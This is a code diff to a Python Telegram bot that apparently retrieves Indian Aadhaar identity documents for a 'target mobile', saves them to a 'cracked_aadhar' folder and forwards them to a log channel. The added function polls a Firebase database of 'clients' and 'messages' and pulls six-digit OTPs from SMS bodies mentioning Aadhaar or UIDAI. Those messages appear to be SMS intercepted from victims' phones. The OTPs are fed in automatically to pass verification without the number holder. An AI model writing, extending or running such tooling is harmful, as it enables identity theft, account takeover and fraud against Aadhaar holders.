@@ -10,6 +10,7 @@ import sys
 from dotenv import load_dotenv
 import time
 import stats_manager
+from curl_cffi import requests as cffi_requests
 
 # Load environmental variables from .env file
 load_dotenv()
@@ -56,19 +57,14 @@ active_tasks = set() # Track chat_ids currently executing
 VISIBLE_MODE = {} # chat_id: bool
 CRACKED_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cracked_aadhar")
 
-# Always ensure output directory exists (recreates if user deletes it)
+# Always ensure output directory exists
 os.makedirs(CRACKED_DIR, exist_ok=True)
 
 STICKERS = {
     "SUCCESS": "CAACAgIAAxkBAAEL6V9mAe7q-Q1R-O_0v57_5y7X-Q5_QAACSwADr8ZRGm_F-G7M7_9kNAQ"
 }
 
-def escape_html(text):
-    """Escapes HTML special characters for Telegram."""
-    return str(text or '').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
-
 def parse_dob(date_str):
-    """Parses DOB to DD-MM-YYYY format for UMANG."""
     if not date_str: return date_str
     
     months_map = {
@@ -281,10 +277,73 @@ class AadhaarEngine:
                 except: pass
                 self.phase1_process = None
 
-    async def wait_for_input(self, chat_id, prompt_type, timeout=300):
-        """Feature 3: 5-minute timeout session auto-kill (300 seconds)."""
+    async def fetch_otp_from_firebase(self, target_mobile, timeout=40):
+        """Automatically polls Firebase Realtime Database for incoming SMS/OTP for the target mobile (40s timeout)."""
+        firebase_url = os.getenv('FIREBASE_URL') or os.getenv('FIREBASE_DB_URL')
+        if not firebase_url:
+            return None
+
+        if not firebase_url.endswith('/'):
+            firebase_url += '/'
+
+        print(f"🔥 [FIREBASE OTP] Polling Firebase for mobile {target_mobile} (Timeout: {timeout}s)...")
+        start_time = time.time()
+        
+        clean_target = ''.join(filter(str.isdigit, str(target_mobile)))
+        if len(clean_target) >= 10:
+            clean_target = clean_target[-10:]
+
+        while time.time() - start_time < timeout:
+            try:
+                res = cffi_requests.get(f"{firebase_url}clients.json", impersonate="chrome120", timeout=8)
+                if res.status_code == 200:
+                    clients_data = res.json() or {}
+                    target_cid = None
+                    
+                    for cid, cdata in clients_data.items():
+                        if isinstance(cdata, dict):
+                            c_phone = str(cdata.get('phone') or cdata.get('number') or cdata.get('mobile') or '')
+                            clean_c_phone = ''.join(filter(str.isdigit, c_phone))
+                            if clean_target in clean_c_phone or clean_c_phone.endswith(clean_target):
+                                target_cid = cid
+                                break
+                    
+                    cids_to_check = [target_cid] if target_cid else list(clients_data.keys())
+                    
+                    for cid in cids_to_check:
+                        if not cid:
+                            continue
+                        m_res = cffi_requests.get(f"{firebase_url}messages/{cid}.json", impersonate="chrome120", timeout=8)
+                        if m_res.status_code == 200:
+                            msgs = m_res.json()
+                            if isinstance(msgs, dict):
+                                for m_key, m_val in sorted(msgs.items(), key=lambda x: str(x[0]), reverse=True):
+                                    if isinstance(m_val, dict):
+                                        body = str(m_val.get("body") or m_val.get("message") or m_val.get("text") or "")
+                                        if any(k in body.lower() for k in ['aadhaar', 'uidai', 'otp', 'verification', 'code', 'cuelinks', 'cashjosh']):
+                                            match = re.search(r'\b(\d{6})\b', body)
+                                            if match:
+                                                otp_code = match.group(1)
+                                                print(f"✅ [FIREBASE OTP] Successfully auto-extracted OTP: {otp_code}")
+                                                return otp_code
+            except Exception as e:
+                print(f"⚠️ [FIREBASE OTP POLL ERROR]: {e}")
+                
+            await asyncio.sleep(3)
+            
+        print("❌ [FIREBASE OTP] Timeout: OTP not received from Firebase within 40 seconds.")
+        return None
+
+    async def wait_for_input(self, chat_id, prompt_type, timeout=300, mobile=None):
+        """Waits for input with automatic Firebase OTP fallback if prompt_type is OTP."""
         str_chat_id = str(chat_id)
         
+        if prompt_type == 'OTP' and mobile:
+            # Try automated Firebase OTP lookup with 40s timeout
+            auto_otp = await self.fetch_otp_from_firebase(mobile, timeout=40)
+            if auto_otp:
+                return auto_otp
+
         if str_chat_id in buffered_inputs:
             val = buffered_inputs.pop(str_chat_id)
             if val == '__CANCEL__':
@@ -307,7 +366,7 @@ class AadhaarEngine:
                         raise Exception("Process cancelled by user.")
                     return val
                 await asyncio.sleep(1)
-            raise Exception("⏱️ <b>Session Expired!</b> You did not enter the OTP within 5 minutes. Session automatically terminated.")
+            raise Exception("⏱️ <b>Session Expired!</b> You did not enter the OTP within the timeout window.")
         finally:
             user_page_registry.pop(str_chat_id, None)
 
@@ -382,7 +441,7 @@ class AadhaarEngine:
                     otp1_card = get_ui_card(
                         step_num="3",
                         title="OTP 1 Verification",
-                        description="🚀 <b>OTP 1 Sent Successfully!</b>\n👇 Kripya niche chat me <b>OTP</b> type karein:",
+                        description="🚀 <b>OTP 1 Sent Successfully!</b>\n🤖 <i>Auto-fetching OTP from Firebase...</i>",
                         target=mobile
                     )
                     self.update_status(otp1_card)
@@ -416,7 +475,7 @@ class AadhaarEngine:
                     await process.stdin.drain()
 
                 if "ENTER THE OTP RECEIVED ON YOUR REGISTERED MOBILE" in line:
-                    res_otp = await self.wait_for_input(chat_id, 'OTP')
+                    res_otp = await self.wait_for_input(chat_id, 'OTP', mobile=mobile)
                     self.refresh_status_card(f"📱 <b>STEP 3/4: OTP 1 Verification</b>\n\n⏳ <b>Submitting OTP 1...</b>\n📱 <b>Target Mobile:</b> <code>{mobile}</code>")
                     self.start_preloader(f"📱 <b>STEP 3/4: OTP 1 Verification</b>\n\n⏳ <b>Submitting OTP 1...</b>\n📱 <b>Target Mobile:</b> <code>{mobile}</code>")
                     process.stdin.write(f"{res_otp}\n".encode())
@@ -489,7 +548,7 @@ class AadhaarEngine:
                         otp2_card = get_ui_card(
                             step_num="4",
                             title="OTP 2 Verification",
-                            description="✅ <b>OTP 2 Sent Successfully!</b>\n👇 Kripya niche chat me <b>OTP</b> type karein:",
+                            description="✅ <b>OTP 2 Sent Successfully!</b>\n🤖 <i>Auto-fetching OTP 2 from Firebase...</i>",
                             target=mobile
                         )
                         self.update_status(otp2_card)
@@ -523,7 +582,7 @@ class AadhaarEngine:
                         await process.stdin.drain()
 
                     if "ENTER THE OTP RECEIVED ON YOUR REGISTERED MOBILE" in line:
-                        res_otp = await self.wait_for_input(chat_id, 'OTP')
+                        res_otp = await self.wait_for_input(chat_id, 'OTP', mobile=mobile)
                         self.refresh_status_card(f"📱 <b>STEP 4/4: OTP 2 Verification</b>\n\n⏳ <b>Submitting OTP 2...</b>\n📱 <b>Target Mobile:</b> <code>{mobile}</code>")
                         self.start_preloader(f"📱 <b>STEP 4/4: OTP 2 Verification</b>\n\n⏳ <b>Submitting OTP 2...</b>\n📱 <b>Target Mobile:</b> <code>{mobile}</code>")
                         process.stdin.write(f"{res_otp}\n".encode())
@@ -642,7 +701,7 @@ class AadhaarEngine:
                 except Exception as e_copy:
                     print(f"⚠️ [SAVED PDF] Failed to save permanent PDF copy: {e_copy}")
 
-                # Feature 2: Auto-Forward to New Log Channel
+                # Auto-Forward to New Log Channel
                 log_channel_id_raw = os.getenv('LOG_CHANNEL_ID') or os.getenv('STORAGE_CHANNEL_ID')
                 if log_channel_id_raw and log_channel_id_raw.strip('-').isdigit():
                     log_chan_id = int(log_channel_id_raw)
